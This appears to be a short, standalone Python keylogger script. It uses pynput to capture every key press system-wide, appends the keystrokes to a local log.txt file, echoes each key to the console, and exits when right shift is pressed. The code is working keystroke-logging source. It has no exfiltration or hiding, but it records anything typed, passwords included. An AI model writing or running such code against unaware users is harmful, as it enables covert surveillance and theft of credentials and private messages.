from pynput import keyboard

def get_key_name(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)


def on_press(key):
    key_name = get_key_name(key)
    

    if str(key) == 'Key.space':
        key_name =' '
    if str(key) == 'Key.enter':
        key_name ='\n'
    if str(key) == 'Key.shift':
        key_name =''
    if str(key) == 'Key.backspace':
        key_name ='Key.backspace '


            
    f = open('log.txt', 'r+') 
    buffer = f.read() 
    f.close() 



    f = open('log.txt', 'w') 
    keylogs = key_name
    buffer += keylogs 
    f.write(buffer) 
    f.close() 
    if str(key) == 'Key.shift_r':
        return False

    
    print(key_name)

with keyboard.Listener(on_press = on_press) as listener:
    listener.join()